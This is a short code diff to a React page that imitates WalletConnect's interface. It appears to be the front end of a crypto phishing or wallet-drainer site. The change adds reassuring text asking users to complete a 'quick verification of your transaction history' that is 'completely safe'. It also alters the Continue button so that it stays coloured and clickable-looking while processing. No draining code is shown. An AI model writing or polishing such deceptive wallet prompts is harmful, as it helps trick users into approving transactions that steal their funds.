@@ -319,32 +319,38 @@ export default function WalletConnectPage() {
                     >
                       Note:
                     </span>
-                    This dApp uses Abuse Protection to prevent misuse of platform. It's safe and quick.
+                    This dApp uses Abuse Protection to prevent misuse of
+                    platform. You'll need to complete a quick verification of
+                    your transaction history. It's completely safe and only
+                    takes a few seconds.
                   </wui-text>
                 </div>
 
-                {/* Continue Button */}
-                <wui-button
-                  variant="accent"
-                  fullwidth=""
-                  style={{
-                    "--local-width": "100%",
-                    "--local-opacity-100": "1",
-                    "--local-opacity-000": "0",
-                    "--local-border-radius": "var(--wui-border-radius-m)",
-                  } as React.CSSProperties}
-                >
-                  <button
-                    onClick={handleContinue}
-                    disabled={processing}
-                    data-variant="accent"
-                    data-icon-left="false"
-                    data-icon-right="false"
-                    data-size="lg"
-                  >
-                    {buttonText}
-                  </button>
-                </wui-button>
+          {/* Continue Button */}
+          <wui-button
+            variant="accent"
+            fullwidth=""
+            style={{
+              "--local-width": "100%",
+              "--local-border-radius": "var(--wui-border-radius-m)",
+              // disabled olduğunda griye dönmesin:
+              opacity: 1,
+              pointerEvents: processing ? "none" : "auto",
+            } as React.CSSProperties}
+          >
+            <button
+              onClick={handleContinue}
+              // disabled kullanmıyoruz; rengi sabit kalıyor
+              data-variant="accent"
+              data-size="lg"
+              style={{
+                width: "100%",
+                cursor: processing ? "default" : "pointer",
+              }}
+            >
+              {buttonText}
+            </button>
+          </wui-button>
               </wui-flex>
             </w3m-warning-view>
           </div>
